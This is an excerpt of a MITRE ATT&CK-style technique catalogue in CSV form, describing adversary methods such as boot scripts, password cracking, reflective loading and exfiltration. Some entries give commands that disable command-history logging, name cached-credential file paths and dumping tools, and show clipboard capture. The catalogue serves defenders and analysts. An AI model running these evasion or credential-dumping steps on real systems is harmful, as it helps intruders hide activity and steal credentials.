Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)","Linux, Windows, macOS",FALSE,FALSE,2020-02-11T18:28:44Z
attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334,4,T1037,Boot or Logon Initialization Scripts,"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  

Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. 

An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:38Z
attack-pattern--149b477f-f364-4824-b1b5-aa1d56115869,4,T1584.008,Network Devices,"Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment, but rather to leverage these devices to support additional targeting.

Once an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices.

Adversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)

Compromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024)",PRE,FALSE,FALSE,2024-03-28T03:29:35Z
attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f,4,T1114,Email Collection,"Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses.(Citation: TrustedSec OOB Communications)(Citation: CISA AA20-352A 2021) Adversaries can collect or forward email from mail servers or clients.","Windows, macOS, Linux, Office Suite",FALSE,FALSE,2017-05-31T21:31:25Z
attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec,4,T1025,Data from Removable Media,"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. 

Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:31Z
attack-pattern--1cec9319-743b-4840-bb65-431547bce82a,4,T1587.003,Digital Certificates,"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).

Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).

After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",PRE,FALSE,FALSE,2020-10-01T01:42:24Z
attack-pattern--1d24cdee-9ea2-4189-b08e-af110bf2435d,4,T1110.002,Password Cracking,"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) 

Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.","Identity Provider, Linux, macOS, Network Devices, Office Suite, Windows",FALSE,FALSE,2020-02-11T18:38:56Z
attack-pattern--208884f1-7b83-4473-ac22-4e1cf6c41471,4,T1036.008,Masquerade File Type,"Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. 

Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. 

Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.

Polyglot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)","Linux, macOS, Windows",FALSE,FALSE,2023-03-08T22:40:06Z
attack-pattern--248d3fe1-7fe1-4d71-91c7-8bb7ef35cad3,4,T1213.006,Databases,"Adversaries may leverage databases to mine valuable information. These databases may be hosted on-premises or in the cloud (both in platform-as-a-service and software-as-a-service environments). 

Examples of databases from which information may be collected include MySQL, PostgreSQL, MongoDB, Amazon Relational Database Service, Azure SQL Database, Google Firebase, and Snowflake. Databases may include a variety of information of interest to adversaries, such as usernames, hashed passwords, personally identifiable information, and financial data. Data collected from databases may be used for [Lateral Movement](https://attack.mitre.org/tactics/TA0008), [Command and Control](https://attack.mitre.org/tactics/TA0011), or [Exfiltration](https://attack.mitre.org/tactics/TA0010). Data exfiltrated from databases may also be used to extort victims or may be sold for profit.(Citation: Google Cloud Threat Intelligence UNC5537 Snowflake 2024)","IaaS, Linux, macOS, SaaS, Windows",FALSE,FALSE,2025-05-22T19:02:46Z
attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64,4,T1559.001,Component Object Model,"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)

Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",Windows,FALSE,FALSE,2020-02-12T14:09:53Z
attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f,4,T1115,Clipboard Data,"Adversaries may collect data stored in the clipboard from users copying information within or between applications. 

For example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation: MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally, adversaries may monitor then replace users’ clipboard with their data (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation: mining_ruby_reversinglabs)

macOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:25Z
attack-pattern--34ab90a3-05f6-4259-8f21-621081fdaba5,4,T1590.004,Network Topology,"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",PRE,FALSE,FALSE,2020-10-02T15:49:03Z
attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807,4,T1567,Exfiltration Over Web Service,"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.

Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.","ESXi, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2020-03-09T12:51:45Z
attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a,4,T1620,Reflective Code Loading,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).

Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)

Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)","Linux, macOS, Windows",FALSE,FALSE,2021-10-05T01:15:06Z
attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179,4,T1547.009,Shortcut Modification,"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.

Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",Windows,FALSE,FALSE,2020-01-24T19:00:32Z
attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470,4,T1087.003,Email Account,"Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)

In on-premises Exchange and Exchange Online, the <code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)

In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)","Windows, Office Suite",FALSE,FALSE,2020-02-21T21:08:33Z
attack-pattern--5e29d64d-2b14-4f92-875e-4c9c498e213c,4,T1685.006,Clear Linux or Mac System Logs,"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the `/var/log/` directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)

* `/var/log/messages:`: General and system-related messages
* `/var/log/secure or /var/log/auth.log`: Authentication logs
* `/var/log/utmp or /var/log/wtmp`: Login records
* `/var/log/kern.log`: Kernel logs
* `/var/log/cron.log`: Crond logs
* `/var/log/maillog`: Mail server logs
* `/var/log/httpd/`: Web server access and error logs","Linux, macOS",FALSE,FALSE,2026-04-14T22:54:04Z
attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d,4,T1078.001,Default Accounts,"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)

Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)","Containers, ESXi, IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2020-03-13T20:15:31Z
attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530,4,T1003.005,Cached Domain Credentials,"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)

On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)

On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) 

With SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix)

Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)","Windows, Linux",FALSE,FALSE,2020-02-21T15:42:25Z
attack-pattern--6faf650d-bf31-4eb4-802d-1000cf38efaf,4,T1125,Video Capture,"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.

Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due to use of specific devices or applications for video recording rather than capturing the victim's screen.

In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:31:37Z
attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69,4,T1070,Indicator Removal,"Adversaries may selectively delete or modify artifacts generated to reduce indications of their presence and blend in with legitimate activity. Rather than broadly removing evidence, adversaries may target specific artifacts that appear anomalous or are likely to draw scrutiny, while leaving sufficient data intact to maintain the appearance of normal system behavior.

Artifacts such as command histories, log entries, or file metadata may be altered in ways that align with expected user or system activity. Location, format, and type of artifact (such as command or login history) are often platform-specific, allowing adversaries to tailor modifications that minimize suspicion.

These actions may not prevent detection entirely but can delay recognition of malicious activity or reduce the fidelity of alerts by making events appear benign or consistent with routine operations. Additionally, selectively removed or modified artifacts may still be recoverable through deeper forensic analysis, though their absence or alteration can complicate timeline reconstruction and attribution.","Containers, ESXi, Linux, macOS, Network Devices, Office Suite, Windows",FALSE,FALSE,2017-05-31T21:30:55Z
attack-pattern--84e02621-8fdf-470f-bd58-993bb6a89d91,4,T1104,Multi-Stage Channels,"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.

Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.

The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.","Linux, macOS, Windows, ESXi",FALSE,FALSE,2017-05-31T21:31:15Z
attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852,4,T1480,Execution Guardrails,"Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019)

Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.

Adversaries may identify and block certain user-agents to evade defenses and narrow the scope of their attack to victims and platforms on which it will be most effective. A user-agent self-identifies data such as a user's software application, operating system, vendor, and version. Adversaries may check user-agents for operating system identification and then only serve malware for the exploitable software while ignoring all other operating systems.(Citation: Trellix-Qakbot)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2019-01-31T02:10:08Z
attack-pattern--8982a661-d84c-48c0-b4ec-1db29c6cf3bc,4,T1598.002,Spearphishing Attachment,"Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email. In some cases, they may rely upon the recipient populating information, then returning the file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. In other cases, adversaries may leverage techniques such as [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) to harvest user credentials via fake login portals.(Citation: Huntress HTML Smuggling 2024)

Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",PRE,FALSE,FALSE,2020-10-02T17:08:57Z
attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5,4,T1048.002,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. 

Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-15T15:34:30Z
attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27,4,T1098,Account Manipulation,"Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. 

In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).","Containers, ESXi, IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2017-05-31T21:31:12Z
attack-pattern--a718a0c8-5768-41a1-9958-a1cc3f995e99,4,T1496.001,Compute Hijacking,"Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. 

One common purpose for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for [Compute Hijacking](https://attack.mitre.org/techniques/T1496/001) and cryptocurrency mining.(Citation: CloudSploit - Unused AWS Regions) Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)

Additionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources.(Citation: Trend Micro War of Crypto Miners)","Windows, IaaS, Linux, macOS, Containers",FALSE,FALSE,2024-09-25T13:34:30Z
attack-pattern--ae797531-3219-49a4-bccf-324ad7a4c7b2,4,T1584.006,Web Services,"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567), or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.",PRE,FALSE,FALSE,2020-10-01T01:01:00Z
attack-pattern--b831f51c-d22f-4724-bbab-60d056bd1150,4,T1690,Prevent Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they have done.

On Linux and macOS, command history is tracked in a file pointed to by the environment variable `HISTFILE`. When a user logs off a system, this information is flushed to a file in the user's home directory called `~/.bash_history`. The `HISTCONTROL` environment variable keeps track of what should be saved by the history command and eventually into the `~/.bash_history` file when a user logs out. `HISTCONTROL` does not exist by default on macOS, but can be set by the user and will be respected. The `HISTFILE` environment variable is also used in some ESXi systems.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)

Adversaries may clear the history environment variable (`unset HISTFILE`) or set the command history size to zero (`export HISTFILESIZE=0`) to prevent logging of commands. Additionally, `HISTCONTROL` can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". `HISTCONTROL` can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that "" ls"" will not be saved, but ""ls"" would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.

On Windows systems, the `PSReadLine` module tracks commands used in all PowerShell sessions and writes them to a file (`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` by default). Adversaries may change where these logs are saved using `Set-PSReadLineOption -HistorySavePath {File Path}`. This will cause `ConsoleHost_history.txt` to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command `Set-PSReadlineOption -HistorySaveStyle SaveNothing`.(Citation: Microsoft about_History prevent command history)(Citation: Sophos PowerShell Command History Forensics)

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. `no logging`).","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2026-04-14T22:53:28Z
attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118,4,T1573,Encrypted Channel,"Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-16T15:33:01Z
attack-pattern--c726e0a2-a57a-4b7b-a973-d0f013246617,4,T1027.004,Compile After Delivery,"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe(Citation: ATTACK IQ), csc.exe, or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)","Linux, macOS, Windows",FALSE,FALSE,2020-03-16T15:30:57Z
attack-pattern--cc723aff-ec88-40e3-a224-5af9fd983cc4,4,T1591.004,Identify Roles,"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.

